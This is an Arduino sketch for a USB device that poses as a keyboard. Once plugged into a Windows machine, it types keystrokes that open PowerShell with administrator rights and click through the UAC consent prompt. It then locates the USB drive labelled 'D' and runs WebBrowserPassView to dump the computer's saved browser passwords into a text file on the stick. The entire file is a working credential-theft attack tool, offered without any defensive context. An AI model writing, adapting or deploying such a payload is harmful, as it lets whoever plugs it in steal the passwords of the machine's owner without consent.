#include "Keyboard.h"
void setup() {
  // put your setup code here, to run once:
Keyboard.begin();

}

void loop() {
  delay(4000);
  type(KEY_LEFT_GUI,false);
  Keyboard.releaseAll();
  delay(1000);
  //toEnglish()
  print(F("powershell"));
  delay(1000);
  type(KEY_LEFT_CTRL,false);
  type(KEY_LEFT_SHIFT,false);
  delay(1000);
  type(KEY_RETURN,false);
  Keyboard.releaseAll();
  delay(1000);
  type(KEY_LEFT_ARROW,false);
  Keyboard.releaseAll();
  delay(1000);
  type(KEY_RETURN,false);
  Keyboard.releaseAll();
  delay(2000);
  
  toEnglish();
  
  print(F("$usbPath  = Get-WMIOBject Win32_Volume | ? { $_.Label -eq 'D' } | select name "));
  type(KEY_RETURN,false);
  Keyboard.releaseAll();
  delay(5000);
  print(F("cd $usbPath.name"));
 type(KEY_RETURN,false);
  Keyboard.releaseAll();
  delay(1000);
  print(F("./WebBrowserPassView /stext pass.txt"));
 type(KEY_RETURN,false);
  Keyboard.releaseAll();
Keyboard.releaseAll();
while (true) ;
}


void type(int key , boolean release){
  Keyboard.press(key);
  if(release)
      Keyboard.release(key);
}

void toEnglish(){
  type(KEY_LEFT_SHIFT,false);
  type(KEY_LEFT_ALT,false);
  Keyboard.releaseAll();
  delay(100);
}


void print(const __FlashStringHelper *value){
  Keyboard.print(value);
}

